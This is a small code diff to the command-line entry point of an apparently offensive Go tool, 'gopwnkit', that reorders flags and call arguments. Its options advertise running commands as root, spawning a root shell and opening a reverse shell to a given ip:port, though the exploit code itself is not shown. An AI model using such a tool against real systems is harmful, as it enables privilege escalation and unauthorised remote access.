@@ -8,16 +8,16 @@ import (
 
 func main() {
 	cmd := flag.String("c", "", "Run command as root in separate process")
+	output := flag.Bool("o", false, "Pipe output of forked command to terminal")
 	shell := flag.Bool("s", false, "Spawn a root shell")
 	reverseShell := flag.String("r", "", "Open a reverse-shell in separate process. Format: ip:port")
-	output := flag.Bool("o", false, "Pipe output of fork command to terminal")
 	flag.Parse()
 
 	var err error
 	if *reverseShell != "" {
-		gopwnkit.RevShell(*output, *reverseShell)
+		gopwnkit.RevShell(*reverseShell)
 	} else if *cmd != "" {
-		gopwnkit.Command(*output, *cmd)
+		gopwnkit.Command(*cmd, *output)
 	} else if *shell {
 		gopwnkit.Shell()
 	} else {
